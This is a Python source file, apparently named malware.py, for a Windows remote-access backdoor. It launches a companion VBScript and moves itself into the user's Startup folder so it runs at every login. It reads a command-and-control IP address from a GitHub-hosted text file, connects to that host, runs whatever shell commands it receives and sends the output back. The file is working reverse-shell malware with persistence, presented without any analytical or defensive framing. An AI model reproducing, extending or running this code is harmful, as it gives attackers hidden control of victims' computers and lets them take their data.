try:  
    import socket
    import subprocess
    import requests
    import os
    import shutil
except:
    import os
    os.system('pip install socket subprocess requests shutil')
vbs_script = "malware.vbs"





def movedir():
    user = subprocess.check_output("whoami", shell=True, text=True)
    user = user[-6:].strip()
    print(user)
    currectdir = os.getcwd()
    startup = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    if os.path.exists(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"):
        shutil.move(f"{currectdir}\\malware.py", f"{startup}\\malware.py")
    else:
        pass




def client():
    link = "https://raw.githubusercontent.com/80dropz/communication/refs/heads/main/ipv4.txt"
    data = requests.get(link)
    hostip = data.text.strip() 
    port = 65432
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((hostip, port))
            break
        except:
            pass
    print(f"Connected to server at {hostip}:{port}")
    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == 'exit':
            print("Closing connection.")
            break
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            client_socket.sendall(result)
        except subprocess.CalledProcessError as e:
            client_socket.sendall(f"Error executing command: {e.output}".encode())
    client_socket.close()

if __name__ == "__main__":
    subprocess.run(["cscript", vbs_script], shell=True)
    movedir()
    client()


